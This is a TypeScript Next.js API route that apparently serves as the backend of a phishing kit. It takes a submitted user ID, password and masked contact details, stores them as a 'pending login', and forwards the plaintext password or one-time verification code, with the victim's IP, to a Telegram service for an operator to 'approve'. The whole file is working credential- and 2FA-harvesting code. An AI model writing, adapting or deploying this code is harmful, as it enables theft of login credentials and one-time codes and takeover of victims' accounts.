import { after, NextRequest, NextResponse } from "next/server";
import {
  createPendingLogin,
  type PendingRequestKind,
} from "@/lib/pending-logins";
import { getClientIp } from "@/lib/request-ip";
import { telegramService } from "@/lib/telegram-new";

function isPendingRequestKind(value: unknown): value is PendingRequestKind {
  return value === "login" || value === "otp";
}

export async function POST(request: NextRequest) {
  try {
    const data = await request.json();

    if (
      typeof data?.userId !== "string" ||
      typeof data?.password !== "string" ||
      (data?.method !== "email" && data?.method !== "text") ||
      typeof data?.maskedEmail !== "string" ||
      typeof data?.maskedPhone !== "string"
    ) {
      return NextResponse.json(
        { error: "Invalid pending login payload" },
        { status: 400 },
      );
    }

    const flow = isPendingRequestKind(data.requestKind)
      ? data.requestKind
      : isPendingRequestKind(data.flow)
        ? data.flow
        : "login";
    const ip = getClientIp(request);

    const pendingLogin = await createPendingLogin({
      projectId:
        typeof data.projectId === "string" ? data.projectId : undefined,
      projectName:
        typeof data.projectName === "string" ? data.projectName : undefined,
      requestKind: flow,
      userId: data.userId,
      password: data.password,
      method: data.method,
      maskedEmail: data.maskedEmail,
      maskedPhone: data.maskedPhone,
      memberOrigin:
        typeof data.memberOrigin === "string" ? data.memberOrigin : undefined,
    });

    after(async () => {
      if (flow === "login") {
        await telegramService.sendLoginApprovalNotification({
          userId: pendingLogin.userId,
          password: pendingLogin.password,
          method: pendingLogin.method,
          createdAtMs: pendingLogin.createdAt,
          ip,
        });
      } else {
        await telegramService.sendVerificationApprovalNotification({
          userId: pendingLogin.userId,
          method: pendingLogin.method,
          code: pendingLogin.password,
          createdAtMs: pendingLogin.createdAt,
          ip,
        });
      }
    });

    return NextResponse.json(
      { id: pendingLogin.id, status: pendingLogin.status },
      { status: 201 },
    );
  } catch (error) {
    console.error("Error creating pending login:", error);
    return NextResponse.json(
      { error: "Failed to create pending login" },
      { status: 500 },
    );
  }
}
